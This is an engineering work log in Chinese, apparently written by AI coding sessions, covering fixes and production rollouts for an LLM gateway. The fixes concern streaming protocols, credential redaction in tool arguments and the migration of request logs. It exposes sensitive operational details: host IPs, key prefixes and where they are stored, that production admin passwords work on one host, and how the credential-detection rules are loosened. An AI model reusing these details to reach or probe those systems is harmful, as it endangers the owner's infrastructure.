> 已修（done 快照挂名 + 侧信道补记）；判据夹具升级为真实捕获帧序列，
> M4 变异红。**判据纪律第 6 条：自建协议夹具必须与真实桥接输出对帧——
> 用无害内容过真网关捕获线帧、换入有害内容回放单测链，别手写形状**。
> 跨模型共性审计：本地 162 条流终止全是本族（minimax-m3 68 + glm-5.3 系 11，
> 修复模型无关同时受益）；154/245 journal 零观测（无 coding-agent 流量形态）。
> 遗留（未修，待 owner 拍板）：Bash 参数里版本号样四元组（17.0.20.1）与
> 用户自有公网 IP（115.29.212.252）仍按 IP 字面量硬阻断（r1013 显式契约）。

> **多会话提交纪律（2026-10-13 实录）**：共享 checkout 里并行会话可能已把
> 文件 `git add` 进暂存区——你的 `git commit` 会消费**整个 index**，把对方
> 半成品一并带入并推送（本轮 2be061b25 误带 6 个引用未提交符号的 s3_wave2
> 测试，6 包在 origin/main 编译断裂，3ec7b5f7c 前向修复退出）。**提交前必看
> `git diff --cached --stat` 只含你的文件**；误入后用 `git rm --cached` 前向
> 退出 + `git show <commit>:<path> > <path>` 恢复盘上内容，不 force-push。

> **r1021（同日，提交 4d6bb3c27，随 2583 上线）**：grok-4.6 空响应 =
> thinking 对象透传给 unknown-relay 中转（vapeur，openai-responses 严格
> 线格式）整条 400。注册表修法：thinking 加 RejectedBy 名单 + 新增
> FieldSpec.RejectedByUnknown 显式开关（唯一允许对 DialectUnknown 也拒的
> 途径，须硬 400 实证；不动 A1.6 的 fail-open 教义）。教训：**IR 序列化
> 路径与扩展还原路径对同一字段的方言政策必须一致**——两路径不一致时，
> 一条修好了另一条还在漏。

> **r1022（2026-10-13，提交 25eca54fa，随本地 2591 上线）**：claude-sonnet-5
> 「返回有 tools 但没有成功执行」= 流式还原毒分支整帧吞掉工具参数 JSON
> 结构字符。/v1/responses 的 function_call_arguments.delta 里出现 marker
> 家族文本（模型自造 `{sensitive_*}` 或回显请求侧遮蔽 marker）且分片边界
> 落在 marker 尾与 `\"`/`}`/`&&` 之间时，restoreStreamStringField 两个
> 整帧遮蔽分支把结构字符一并换成 `[REDACTED]`，客户端拼接参数 JSON.parse
> 失败→工具不执行→模型重发死循环。修复：JSON 参数 lane（三协议共用）改
> 跨度级遮蔽（分支 A 透传 restored，分支 B `redactedMarker + value`），
> 散文 lane 保持 r244 整段契约。判据同层驱动 + 真实捕获分片回放 + 前提
> 在场配对，M1/M2 单分支变异红。**踩坑**：`reservedMarkerStarted` 要求
> 扣住前缀含完整 `{sensitive` 词——短前缀 `{sens` 的续帧走的是 verbatim
> 释放路径，第一版判据因此假绿；变异不红时先用探针找准分支触发条件。
> **取证方法论**：解包 ZCode（AI-SDK）确认工具 input 取自
> output_item.done 的 arguments 并被 JSON.parse，才把「客户端解析错误」
> 定位到参数字符串完整性上。遗留登记：Responses 桥 message/function_call
> 同 output_index:0（规范违规、现 SDK 不炸）未动。
> 详见 `docs/audit/2026-10-13-claude-sonnet-5-tools解析错误-r1022.md`。

> **r1023（2026-10-13 下午，提交 1b370b13b，随本地 2593 上线）**：Responses 桥
> 两条线协议契约修正（OpenAI→Responses / Anthropic→Responses 共 scaffold）。
> ① output_index 唯一化：旧实现把上游 tool_calls[].index / content_block
> index（几乎恒 0）直接当 output_index，与预声明 message item（0）线上冲突。
> scaffold 新增 wire-index 分配器（message=0，工具按首次出现 1,2,…），两个
> writeChunkIR 在任何索引键控状态（fit/hold/toolCallIDs/toolStates）之前统一
> 重编号。② output_item.done 的 function_call item.status 必须是字面量
> "completed"（AI-SDK Zod literal 硬契约，length 截断曾带 "incomplete" 使
> 客户端整流解析失败）；截断语义只在终态 envelope（status+incomplete_details）。
> 判据 `domains/streaming/r1023_responses_output_index_contract_test.go`（同层
> 驱动两桥逐帧断言+前提在场），M1 撤重编号两方向红 / M2 状态回退红。
> E2E（2593，claude-sonnet-5）：/v1/responses 并行双工具 output_index
> {0,1,2} 且参数合法；/v1/messages 文本+工具块结构正确。
> **登记未动**：截断流的事件名恒为 response.completed（终态判定器
> attempt_commit_gate 按此 grep，改事件名需连带评估）；tool-only 流的
> message item 预声明后不关（added 无 done）；AI-SDK 对 function_call
> arguments.done/content_part.added 走 unknown_chunk 容忍分支不校验。

---

# 追加：2026-10-13 S3 波 3 —— 停写收尾（最后一处漏网写点）+ 读侧第二分片

> 会话目标：继续完成 request_logs 读写向 session_turns 的转换、停掉
> request_logs 相关写入。提交 `f61f24bd1`，本地部署 2594（8782）验证通过。
> 明细见 `docs/audit/2026-10-13-s3-wave3-stopsweep-and-readsource-next-shard.md`。

## 写侧（全仓盘点后：唯一漏网写点已收口）

- 全仓扫描（非测试）request_logs 家族写语句逐一核对：telemetry client /
  admin ingest / lite sink / trace.FlushToPG 均在 S4 门内；promote/archive/
  data_lifecycle/credential reset 属存量生命周期或运维语义（保留）。
- **`domains/streaming/audio_usage_log.go` 是最后一个未挂门的流量写点**
  （音频计量行不走 telemetry 链），已按 R52 trace 语义挂门：停写即丢弃
  （计费走 maas 不受影响）。音频秒数观测无会话族落点——与探针行同桶
  （主拍板项）。判据 `audio_usage_gate_test.go`（零期望 pgxmock = 停写
  行为断言 + 门开前提在场），反转门变异红。
- 本地实证：翻转（07:01:04）后 request_logs_hot/bodies_hot 零新行，
  2594 部署后仍零（门保持）。

## 读侧（波 2 §5 登记的三项下片债清偿）

1. **tenants.go logsTable 四臂化**（R36-A1 性能裁决读面）：两条会话腿
  （冻结点守卫 + 双子排除）+ 两条 v1 腿原样（零反连接，30s 裁决保持）。
   新原语 `db.V1FreezeCutoffSQL`（v1 两表 max(ts)；max 必须同盖 hot∪母表，
   只看母表会把冻结点定在数小时前）。**实测教训：镜像行 ts ≠ v1 行 ts**
  （差 ~15s，落库侧时刻），冻结点单独用会在翻转边界双计（真库实测 1 例）
   ⇒ 消费方必须同时在会话腿带 NOT EXISTS v1 双子。
2. **popularModelsHotSQL → 会话族原生源**（listTopModels 同款回退链）；
   文件脱离 v1 族，四登记表除名（tiering 114→113、静默档 61→59，审计
   文档已订正）。
3. **auto_index_refresher 双源化**：前置实测坐实 audit 的担忧——会话侧
   raw_model_name 是**剥 provider 前缀的归一化名**，精确等值只 54%；
   alias 链（lower(t.model)→model_aliases→canonical→offers）恢复 96.5%
  （v1 侧 96.7%）。**half-1 与 half-2 反连接必须同迁**，否则停写后
   cold-start 基线每 5 分钟经 ON CONFLICT 覆盖真实指标。model_task_index
   **登记不迁**（auto 请求不进会话族：实测 3,420 vs 0）。
4. 在线验证（2594）：tenant stats 今日 10,224 条含翻转后流量；picker
   usage 源真实计数；refresher 新桶 7-11 行真实指标；readyz ready。

## 判据纪律增量（第 7 条）

**形状钉桩对「N 条同构腿」必须 count==N 而非 Contains**：只查在场时，
「删一条腿」的变异仍绿——而那正是最危险的静默回退（half-2 抑制腿被删 =
基线覆盖真实指标）。本轮两处判据（tenants 冻结点×2、refresher 会话腿×2）
都经历了「第一版 0 红 → 加强 count==N → 红」。

## 本轮自伤事故（量具教训复刻）

变异验证脚本里 `git checkout -- admin/tenants.go` 想恢复被变异的文件，
把**自己未提交的工作全部洗掉**（共享 checkout 清洗风险的自己动手版，
与 memory「shared-checkout-wipe-hazard」同源）。重做后改为 `cp` 备份恢复。
变异恢复一律不用 git 命令。

## 既存红（pristine 同红，非本轮引入）

`bg/TestDirectProbeBodyUsesAnthropicMessagesShape`（HEAD 8c6aa6d584 即红，
probe body 形状断言）；工作区另有并行会话 r1023 的缩进级遗留
（executor_anthropic.go +4 个 ir 测试，无语义，未随本轮提交）。

---

# 追加：2026-10-13 r1024 —— 多轮 tool × 脱敏还原 E2E（三家供应商 × 四台部署）

> 用户目标：特色模型（minimax / z.ai / vapeur ai）经网关逐模型发 ~5 轮带
> tools 的请求（/goal 提示词=拉主分支合并 / 24h 审计两型），跟踪 log 修问题、
> 部署再验证，直到全绿；重点是参数收发与转换——**脱敏介入后客户端必须拿到
> tools 参数里可用的真实值（IP/用户/密码），拿到占位符=无法操作**。
> 提交 `95640a655`（+ 后续 deploy-211 密钥透传），本地 2595→2600、
> 245=2601、154=2602、211 docker 全部部署并 E2E 验证通过。
> 明细与判据：`docs/audit/2026-10-13-r1024-多轮tool脱敏还原E2E.md`。

## 七缺陷一句话清单（详见审计文档 §二）

1. **身份字段硬阻断**：`username/account/login` 与密码族混在一个
   `credentialField`，裸用户名结构性不可能成为占位符 → 任何带 username 的
   SSH 类 tool 调用整流 `output_policy_blocked`。已拆
   `secretCredentialField`（保留硬拦）vs `identityField`（放行，仍走检测器
   +外传目的地检查）；**畸形形状（number/bool/map）仍全集 fail-closed**。
2. **YAML account 漏检**：`ssh_user=/db_user=/user=` 形态不在 account 正则
   → 用户名明文出网关。label 集补 `user(?:name|_name)?|[a-z0-9_]*_user`。
3. **钉扎静默失效**：`ChatHandler.SetAdminAPIKey` 全仓无人调用 →
   `X-LLMGW-Preferred-Credential` 恒被忽略（E2E 归因失真的元凶）。
   main.go 已接线。
4. **openai-responses 供应商 tool 历史被散文折叠**：`IsToolUseCapable`
   协议启发式补 openai-responses（vapeur 折叠后模型用散文模仿工具调用，
   客户端拿不到结构化 tool_calls）。
5. **无 `event:` 行的 Responses SSE 终态误判**：事件名从 payload `type`
   回填；此前 terminal 永不置位 → 完整响应后补发 response.failed +
   探针 3 连败停节点（no_candidate 连坐）。
6. **chat 嵌套形 tools 发 /v1/responses**：native 出站前
   `NormalizeResponsesTools` 归一化平铺（转换而非拒绝；上游 400 会被当
   transient 重试三次+连坐凭据）。
7. **模型自造占位拼写**：`"password":"PLACEHOLDER"`/`"USE_DEPLOY_PASSWORD"`
   三路判据放行（字面量集 + 值自指涉凭据关键词 + 模板包裹形）；
   普通明文（hunter2 类）照拦。**模型自造公网 IP（1.2.3.4）仍拦——r1013
   显式契约，不是误伤**。

## E2E 覆盖（全部 PASS：客户端零占位符泄漏、参数 JSON 合法、真值逐字还原）

- 本地 2600：3 供应商 × chat/responses 两腿 × merge/audit 两场景 ×
  10+ 项目目录（gateway-2/memora/nbjjl/crm-go/GEOFlow/network-switch/
  agent-companion/RedClaw/acc-toolkit/pocket-opencode/marketing/myvpn）。
- 245=2601-95640a65（8782）：MiniMax chat + grok responses PASS（SSH 隧道）。
- 154=2602-95640a65（8781）：glm chat + MiniMax responses + claude responses
  PASS。
- 211 docker（同代码，二进制含 changeme 指纹）：MiniMax/glm/grok/claude
  全 PASS。harness：`/tmp/gwtool_e2e/tool_roundtrip_e2e.py`（判据 A-E 详见
  审计文档 §一）。

## 211 部署的三个新坑（本轮实测）

1. **envs SSOT 本机又消失**（~/workspace 两处都没有 loader.sh）：
   从 252 `/root/workspace/ai-native-tools/envs/` 拷回，且那是 252-root
   专用 stub（密钥路径 /root/.ssh）——本机版 stub 要指向本机
   ~/.ssh/id_ed25519。deploy-seamless 的 ENVS_ROOT 双候选兜底已进 main
   （160 行段），但候选路径仍是那两处，SSOT 真身在 252。
2. **211 的凭据密文解密钥匙**：库是生产副本，credentials 按
   `CREDENTIAL_ENCRYPTION_KEY`（44 字符 base64url，.env.local 里 fL0ML 开头
   那把，与 245 一致）加密；deploy-211 原先只注入 SECRET_KEY（随机生成）
   → node_probe 全量 `cannot decrypt: unknown format` + 路由全灭
   key_decrypt_failed。**deploy-211-docker.sh 已补透传**（环境变量 →
   gateway.credkey 持久化 → -e 注入；--via 转发）。
   ⚠ 本地部署根 .env 里的 CREDENTIAL_ENCRYPTION_KEY（9e7456 开头 64 字符）
   解码失败会静默回落 SECRET_KEY 路径——本地能跑是靠 SECRET_KEY=生产值
   的 SHA256 兜底；**别把它当真钥用**。
3. **211 每 deploy 换 Redis 库号**（15→14→…→10，claim 不粘）：URSM 全新
   冷启动 → grok/claude no_candidate。恢复：admin
   `PATCH /api/routing/emergency-repair`（force_enable, cred 63）或等探针
   回写。claim 不粘的根因未查（登记）。
4. 211 无 LLM_GATEWAY_ADMIN_* env：users 表是生产副本，.env.local 的 admin
   密码直接可用；`ssh 192.168.31.211`（需在 ~/.ssh/config 加
   `Host 192.168.31.211 User root`，deploy-211 的 rsync 默认用本机用户名）。

## 判据纪律增量（第 8 条）

**供应商级结论先证钉扎**：「glm-5.3 会折叠 tool 历史」这个误判浪费了小半
小时——真因是钉扎静默失效、请求被路由到 nvidia/vapeur。归因到供应商前必看
`upstream_http_attempt` 的 provider_id/credential_id 是否是指定值。

## 遗留登记

- `password_restored`（还原后的真实密码）在 sanitize 守卫视角=非占位符凭据
  值（现链序守卫在还原前，不触发）；若有人把守卫挪到还原后会打断闭环——
  判据矩阵已有钉子。
- 散文里带 JSON 转义的占位符还原兜底为遮蔽（折叠修复后出现率大降，留观）。
- 模型自造公网 IP 的早产调用整流拦（r1013 契约保留）；「只丢单条 tool call
  而非整流」需协议级手术，另立轮次。
- 211 Redis 库号 claim 不粘 + UrsmlHealthyKeyReconciler 在 211 容器未起
  （154/245 有 `ursm.v2 healthy-key reconciler started`，211 日志无此行），
  冷启动靠 emergency-repair——两件一起查。

---

# 追加：2026-10-13 r1025 —— Vapeur 复验轮 + 钉扎×fp_slot 预过滤缝隙修复

> 复验 r1024+审计轮（2603）之后的 Vapeur 全量矩阵（10 模型 × T1/T1b/T2，
> tools+thinking high/medium）。修复 P7：admin 钉扎（r1024 激活）与 fp_slot
> 预过滤叠加时，钉扎凭据先被预过滤剔除、再被 dispatchRoute 硬 pin 过滤收窄
> 成 0 候选（未触上游即 503）。修复=预过滤豁免钉扎候选（抽取
> `Executor.fpPrefilterCandidates`），降级路径交给既有 dispatch Acquire 的
> no-slot 继续。提交含判据
> `TestFpPrefilterKeepsPinnedCandidateWhenSlotSaturated`（同层驱动 + 去 pin
> 反例），变异红在正确断言。部署 2604 后 glm-5.3 全套件复绿。
> **上游能力登记修正**：claude-haiku-5-5 在 Vapeur 流式两腿持续封锁
> （chat 腿 400 Operation not allowed / responses 腿 502 不支持流式，直连
> 证实，非「偶发过载」）；opus 流式正常。非流式不受影响。
> 详见 `docs/audit/2026-10-13-Vapeur复验轮-r1024后全量矩阵与钉扎fp预过滤修复.md`。
> 量具坑：部署重启后的候选预热空窗实测可达 **3 分钟**（kimi 15:34→15:37），
> 批次测试首跑失败先重试再定罪；E2E 批次要带 ≥20s 间隔，上游 429 是节奏问题
> 不是模型故障（grok/deepseek 重测即绿）。

---

# 追加：2026-10-13 r1026 —— grok-4.6「不可靠」双根因：URSM 键 TTL 被流量砍缩 + tentative restore 必然回环

> 用户报告：经 llm.kxpms.cn 调 grok-4.6 不可靠/总失败，怀疑「供应商模式没生效」。
> **模式没问题**（proactive chat→responses 升级在生产生效，实测出站 URL=
> `api.vapeur.ai/v1/responses`）；真根因是可用性层两缺陷，修复已部署。
> 详见 `docs/audit/2026-10-13-grok46不可靠根因-ursm键ttl砍缩与tentative回环-r1026.md`。

1. **record_request.lua(+dual) prio>10 分支砍缩 TTL**：probe 键 7h 地板
   （probeWriteTTLFloor）被每条流量遥测 `EXPIRE node_ttl`(15min) 砍回；
   稀疏流量模型（grok-4.6 48h 27 行）每次空闲>15min 键过期 → 视图红 →
   唯一候选被滤 → 9s sync probe 挂起（实测冷请求 15.8s vs 热 7-9s）。
   修复=extend-only（只延不砍，TTL=-1 不动，prio≤10 原语义不变）。
   判据 `TestRecordRequestProbePriorityKeyTTLNeverShrinks`（3 子用例），
   变异红在正确断言。脚本长度钉子 13089/11579 随更。
2. **ProbeSync tentative restore 回环**：2026-08-24 盖章
   `probe_revert_at=+15min` 依赖「下一次确认探测」，2026-09-20 park 政策
   使确认结构性永不到来 → ProbeRollback 每 15min 必然翻红 5min
   （实测锚点：16:23:11 盖章 → **16:38:08** `probe_revert_timeout` 翻红），
   翻红窗内请求再触发救援再盖章 = 自持循环；且翻红期间 reconciler 的
   `cmb.available=TRUE` 谓词把该对排除在修复外——两根因互相放大。
   修复=删盖章调用（恢复为最终态；`MarkTentativeRestore`/ProbeRollback
   机制保留消化滚动部署期存量盖章行）。判据改写为
   `TestProbeSyncRestoreIsFinalWithoutTentativeStamp`（反契约 + R-vapeur2
   两条竞态不变量保留），变异红。
3. 部署：154=**2576-9e2d77b9**（17:14 切流，active_port=8782；本 checkout
   的 seq 计数器独立，2576<2602 是正常现象，以回显 version= 为准），
   二进制指纹：`Extend-only`×2 + `revert loop` 在场、
   `tentative restore stamp failed` 消失；154 同时补齐了 r1025。
   245 同构建并行部署。**本次部署从 llm-gateway-go-4 checkout 以脏工作区
   构建（用户流程=先部署验证后提交），发布 sha 显示 HEAD 提交号但产物含
   本轮修复，用 strings 指纹判定。**
4. 开放项（登记不修）：① reconciler 盲区——键过期后 14+ tick 未修、
   `repaired≈36/tick` 恒定轮转未解释（修复①后用户面影响缩小，灾难恢复
   场景仍需单独根修）；② fp_slot 新实例启动即 ratio=1（指纹槽跨重启
   残留，降级放行正常）；③ persist collect 30s SCAN 仍超时（既有）；
   ④ 死凭据 72/68 的 expired-binding 恢复队列空转待 owner 清退。
5. 量具坑：epoch 毫秒心算连环错（必须 `date +%s%3N` 同框比对）；
   strings 找注释短语先确认短语真在源里（`existing_ttl` 这类新标识符
   是可靠 marker）；共享 db2 禁用 `--scan` 全库（挂死 ssh，两次实证）。

# 追加：2026-10-13 S4 波 4 —— bodies 退役评估（25 文件登记转绿）+ 四处读方迁移

> 用户目标：request_logs 及相关表按规划将删除、只留 session_*；对涉
> request_logs 的查询/API 尽量切换，无法切换的修正内部实现，数据前后一致。
> 提交 `afc44baac`（+ 后续守卫修复提交）。本地部署 2605→2606（8782）验证。
> 明细与判据：`docs/audit/2026-10-13-s3-wave4-bodies-retirement-assessment.md`。

## 数据一致性结论（删表前置的事实基础，本地真库实测）

v1 冻结存量 35,506；v1_only 23,795 = **探针观测 22,951（无会话头，R51 设计
不镜像）+ 回环/非终态 844；真损失 0**（带会话头未镜像行全为设计内跳过）。
⇒ 删 request_logs_bodies 不丢用户可见正文。两个易踩口径坑：
- `MirrorDriftClassSQL` 字面转录会把无会话头探针行判 genuine_loss——
  drift 校验器的范围 SQL 在分类前就过滤 `gw_session_id IS NOT NULL`，
  两者不矛盾；自己写分类查询必须带会话头过滤。
- **JSON 字面量 null 是标量**：jsonb 列里 `typeof='null'` 的行 SQL 值非
  NULL，COALESCE 救不了，裸 `jsonb_array_length` 直接 22023（2605 端点
  实测抓到，本地 outbound 非空行 1,433+ 条）。凡对 jsonb 列做数组/对象
  运算，先 `jsonb_typeof` 判形。

## 本轮四处读方迁移（前两处是活缺陷修复）

1. **session_bodies_batch 主取数器固定会话族源**：消费方 session_compare
   turns 腿是会话族，bodies 腿却读 v1 视图——停写后新会话正文对对比/摘要
   **静默为空**（跨冻结会话实证：24 轮 v1 源只见 13）。修复后端点实测
   冻结后 57/57 全有正文。summary_v2 的 v1 回退路径保留**显式命名的 v1
   变体**（turns 腿与 bodies 腿必须同族），随 v1 退役。
2. **session_compare 解析器补 delta 数组臂**（request/response_delta 是
   消息数组；v1 request_body 是带 messages 键的对象——两种形状都会到达，
   双臂并存，数组臂在前互不误吞）。
3. **compression_sessions 整端点会话族化**（canonical turns ×3 + bodies
   源 ×3；LATERAL 改 jsonb_typeof 守卫的数组长度；ts 等值配对删除）。
4. **scenario_driver 断言改数 session_bodies_hot/session_turns_hot**
   （停写后数 v1 delta 恒 0，s22-3/s23-3 永久 FAIL——修掉）。

## 退役门里程碑

`v1BodiesReaders` 25 文件四组登记填齐，`TestV1BodiesReadersAreAssessed`
**首次转绿**（按门自身定义：全绿=登记齐=才谈得上 request_logs_bodies 可删）。
admin 全包绿（负向闸门 bodies 这道已功成身退；bodies 退役门余下的
`TestV1BodiesReadersAreAssessed` 不再红）。审计网络 7 张登记表同步
（静默档 59→58、tiering 105/113→103/111、population 49→48、盲区 44）；
**manifest 工具测试清偿波 2/3 的 8 条旧账**（snapshot 73→92/canonical
12/18→22/36）复绿——那道门自波 2 起一直红着没人跑。

## 删 request_logs_bodies 前置清单（登记在退役门内，DROP 前必须完成）

1. data_lifecycle_blobs 会话臂扩展（否则停写后新正文无容量治理）；
2. quality_correlations 重写（业务 auto 行改**原生 outbound_body**——机械
   换切换层会静默塌桶，request_delta 无 tools 键；探针维度归 node_probe_runs）；
3. 生产 owner 复核同口径四象限 + 未镜像遗留会话（sessions_v2.enabled=false
   时代）人群规模——它们的摘要回退随 v1 消失；
4. 生产 settings_kv 确认 `storage.session_bodies_native_read=true`。

## 多会话实录

本轮工作区再次被并行会话在我编辑期间合并 r1025（HEAD db33818→9e2d77b），
我的未提交改动全部幸存；按 shared-checkout 纪律完成后立即原子提交推送。
并行遗留（executor_anthropic/ollama 缩进级 + ir 测试空白行）经 `git diff -w`
核实纯空白，不阻塞从本 checkout 部署。

> **S4 波 4 下半场（同日，2607 上线）**：删表前置清单的两个实现项落地——
> ① data_lifecycle_blobs 会话臂扩展（Top-N/preview 治理 session_bodies 族
> outbound_body+双 attachments，execute 目标 session_bodies_hot 且**增量正文
> 刻意保留**；端点实测 preview >50KB 命中 426 行/34.6MB）；② quality_
> correlations 会话族重写（canonical turns + 切换层 outbound_body，tools 桶
> jsonb_typeof 守卫；探针样本出围属拍板口径变更——本地 v1 auto 23,786 行里
> 探针占 22,951，业务 auto 流量到达前分桶空是新口径的如实反映）。判据
> M6/M7 变异红；登记表七张同步（静默档 58→57、tiering 101/25/110、
> population 46、blobs 出列 + quality 改判 already-switched、manifest 94）。
> 删 request_logs_bodies 的代码侧前置至此**全部完成**，余下两项属 owner
> 动作：生产库四象限复核 + 确认 native_read=true（然后才可执行 DROP）。
> 量具教训（第三次实证）：对 jsonb 列做运算前先 `jsonb_typeof` 判形——
> JSON 字面量 null 的 SQL 值非 NULL，COALESCE 救不了（M5 的 22023 与
> M7 的守卫同源）。

> **r1026（2026-10-13 下午，提交 50acf8ce5，随本地 2608 上线）**：grok-4.6
> chat 流式整流 503 = `stream_options.include_usage`（AI-SDK 流式恒发）经
> KindPortable 透传进 **openai-responses 出站体**（该线格式无此字段），
> vapeur 严格中转 400 Unknown parameter、单候选即整流失败。修复是
> **pass1/pass2 双层同形线格式守卫**（internal/ir/extensions_restore.go 与
> domains/transformation/ir_converter.go）：目标线格式为 Responses/Anthropic/
> Gemini 时裁剪并上报 loss，chat 线（含 unknown-relay）保持透传——刻意不用
> RejectedByUnknown（会把 chat 形态中转的 include_usage=false 语义反转成
> 注入的 true）。usage 契约由 R32 桥的 response.completed 提取兜底，实测
> usage 帧仍回客户端。r1021「两路径政策必须一致」教训再次实证：只修 pass1
> 时 pass2 会把字段从 Extensions 重新写回。判据用 raw-logs 真实失败请求
> 回放 + 前提在场配对，M1/M2/M3 三变异红。详见
> `docs/audit/2026-10-13-r1026-grok-chat流式stream_options泄漏进responses线体.md`。
> 同轮登记不动：nvidia 系探针 503（egress 代理缺失，owner 拍板项）、
> routing_analytics_7d 刷新 23505、ursm_node_snapshot_min 42P17（均非请求路径）。

> **生产删表前置确认（2026-10-13 晚，S4 波 4 收尾，只读经 245 直连）**：
> 生产双写仍在（write_enabled=true）、`storage.session_bodies_native_read`
> **未设置**（默认 v1 臂）。**带会话头真损失 158 条（168h 窗 147）≠0 ⇒
> 生产翻转未就绪**：根因是 154 的镜像写对共享 PG 超时（日志实证
> `sessionv2mirror: V2 shadow write failed`，今日 5-54 次/小时持续；245 零
> 失败；outbox reaper 正常但入队超时的行不进 outbox、不可重放）。丢失行
> 可从 v1 定向回填。探针观测 156,385 行（设计不镜像）维持 owner 拍板。
> **翻转 runbook 五步（顺序刚性）**：修 154 超时→168h 零损失→回填 158 行→
> native_read=true→停写→owner 授权后 DROP。详见波 4 审计文档 §九。

> **r1026b（2026-10-13 晚，批判式审计轮，提交 af27bb7b4e + 6adf6b00f，
> 随本地 2611→2614 上线）**：对 r1026 复审判据的探边抓到两真缺陷。
> ① **D1 native Responses 透传腿第三泄漏口**：/v1/responses 客户端的
> ResponsesBodyBytes 原文直发不经 IR 序列化，r1026 的 pass1/pass2 守卫
> 均不可见 → stream_options 原样送达严格中转 400（response.failed
> provider_unavailable）。修复=native 分支 choke point 调
> transformation.StripStreamOptions + reactive 重试腿同源同治（2614）。
> ② **D2 reasoncap 表 grok-4.6 行无实证登记 xhigh**：paramguard 钳制
> 空转，ZCode 显式 reasoning_effort=xhigh → vapeur grok-4.6-1 后端 400
> （上游明示支持集 none|low|medium|high）。按实证订正表行后钳到 high。
> ③ 本地栈（网关/Redis/PG）19:21:09-10 被**协同停止**（来源未定位，
> 登记），本轮手工恢复三件套。④ 判据纪律第 9 条（候选）：**变异脚本
> 必须先验证变异落盘**（perl 未转义 `()` 是捕获组→变异无操作→绿被
> 误读为判据无效）；**线格式泄漏检测必须解析 JSON 顶层键**（字符串
> 包含会把正文讨论该参数的流量判成泄漏，raw-logs 复核 11 条全假）。
> ⑤ 同轮登记不动：上游 400 外显为 model_not_found/transient/retryable
> 的误导性包装（既有行为，动外显契约属维护者拍板）。
> 详见 `docs/audit/2026-10-13-r1026-批判式审计轮.md`。

---

# 追加：2026-10-13 晚 —— 生产 245/154 + 211 停写翻转执行与三台验证

> 用户指令：关闭 245/154 双写并测试验证；再关闭 211 双写，并确保 211 各
> 服务目录与数据库文件在 docker 外（/opt/kaixuan 相关目录）。

## 执行序（245/154，共享库 settings_kv 翻转一次覆盖两台）

1. **先部署后翻转**（前置核查：部署态 2601/2602=r1024 含 wave2/3 读迁移、
   缺 wave4——直接翻转会让 compare/compression 显示空正文/全零）：
   部署 2612/2613-af27bb7b → 翻转中抓到两个**生产规模集成缺陷**并当日
   修复重部署 2617/2618-d3ce08d8：
   - **compression_sessions LATERAL 重跑 canonical 全源**（本地 12k 行测
     不出，生产 925k turns × ~1k 会话把 10s 预算打满）→ 单趟 CTE +
     DISTINCT ON（提交 e01ffed39，判据禁 LATERAL，M8 红）；
   - **quality_correlations avg_quality 裸 AVG**（会话族 quality_score 可
     全 NULL → Scan 崩）→ COALESCE（提交 d3ce08d86，M9 红）。
2. `sessions_v2.write_timeout_ms=5000`（默认 2000）：**154 镜像滴漏止住**
   （此前 5-54 次/小时；调参后归零——免部署调参先行的实证）。
3. `storage.session_bodies_native_read=true` → `storage.request_logs_write_enabled=false`
   （**20:18:27**，经 245 直连共享库写入）。
4. 验证（两台）：request_logs_hot max_ts 冻结在 20:18:11；session_turns_hot
   持续推进；post-flip 会话 compare 200 且**正文在场**（wave4 修复生产实证）；
   端点清扫两台一致——sessions/compression/blobs/quality 全 200，
   **data-lifecycle/stats 500@30s**（v1 存储语义端点的生产规模超时，
   既存问题非翻转回归，登记随 v1 退役）。

## 211（192.168.31.211，docker 形态）

- **目录合规核查**（用户重点）：DB=acc-pg17 bind `/opt/kaixuan/data/pg/
  acc-pg17` ✓、Redis=nbjl-redis bind `/opt/kaixuan/data/redis` ✓（该机
  DEPLOY-STANDARDS 总纲「容器是空壳，数据在宿主 /opt/kaixuan/data」，
  data-placement-report.sh 可复核）。**网关容器是唯一违规**（零挂载，
  keystore/hotzone 等状态在容器层，每次部署 rm -f 即清空）→ 已迁移：
  docker cp 导出 → `/opt/kaixuan/data/llm-gateway/{data,logs}`（uid 65532）
  → **deploy-211-docker.sh 补 bind mount**（提交 562cc1e6d，后续部署保持）
  → 重部署验证（容器内可见宿主状态、keystore 完整）。
- **双写已是关闭态**（其库为本机库副本，继承翻转设置；实测行为吻合）；
  补 write_timeout_ms=5000 对齐。**E2E 决定性验证**：建 key → 真实
  glm-4.5-flash 请求（21:21:55）→ session_turns_hot 有该轮（内部 uuid
  7d19f081）、bodies 窗口 31 行、**request_logs_hot 恒 0** ✓；管理面
  4 端点 200（毫秒级）+ compare 有正文。
- **新坑（登记）**：① 网关容器**重建后首启可能 DB 池判 no-DB 且不重试**
  （重启即愈；根因未深查）——而 deploy 脚本就绪门只查 readyz 200，
  **lite 回落也返 200**，门形同虚设；后续应断言 readyz 的 mode 字段。
  ② 重部署后 redis 库号又漂（10→9，claim 不粘，既有登记项）。
  ③ 211 的 ursm 降级理由是 SYSTEM_MONITOR_ENABLED（与 154/245 的
  reconciler 差异，既有登记项）。

## 量具与运维注记

- llm.itestu.cn 从 252 访问曾超时（该入口指向**本机 mac 网关**，与生产
  翻转无关；252 侧 netbird/mihomo 链路抖动，留观）。
- 生产 158 条真损失行仍在 v1 可回填（DROP 前）；154 滴漏虽止，翻转后
  镜像是唯一记录，**write_timeout_ms=5000 需保留**。

---

# 追加：2026-10-14 r1027 —— /v1/models 只列真正可路由的模型

> 用户指令：把「/v1/models 只列出真正有 provider 的模型」做掉。
> 详见 `docs/audit/2026-10-14-models只列可路由模型-r1027.md`。

1. **根因是两张活度表**：发现端点旧查询读 `model_offers.available`，而故障
   阶梯只翻 `credential_model_bindings` / `credentials.availability_state /
   quota_state`——死凭据的模型永远被 advertise。两层缝隙都实测抓到：
   绑定门之后 grok-4.7 仍在列（五死凭据 67/68/69/70/72 的 binding 挂
   available=t 且 lifecycle status='active'），补凭据级
   `availability_state='ready'` + `quota_state != permanently_exhausted`
   门（healthyCandidateSQL 同款）+ `node_probe_state.consecutive_failures=0`
   防余额死凭据 binding 抖动闪烁。620 → 139。
2. **逃生舱**：settings_kv 平台键 `models.list_only_routable`（默认 true，
   热加载）；置 false 回 model_offers 旧语义。生产实测 138→617→138 往返。
   判据 `domains/streaming/models_routable_test.go` 四件套；变异红；
   spec 未注册时 GetPlatformBool 会静默回退默认值——键必须进
   ModelsSpecs（有钉子）。
3. 部署：154=2584（8782）、245=2586（8781）。E2E 直连/经 nginx 一致，
   死模型出局、活模型保留。
4. **部署量具坑（重要）**：`deploy-*.sh | grep | tail` 管道无 pipefail 时
   会把构建锁失败吞成「成功」（2582/2583 两次假成功）；部署命令一律
   `> log 2>&1; rc=$?`。共享构建锁 kx-llm-gateway-build.lock 是全机互斥
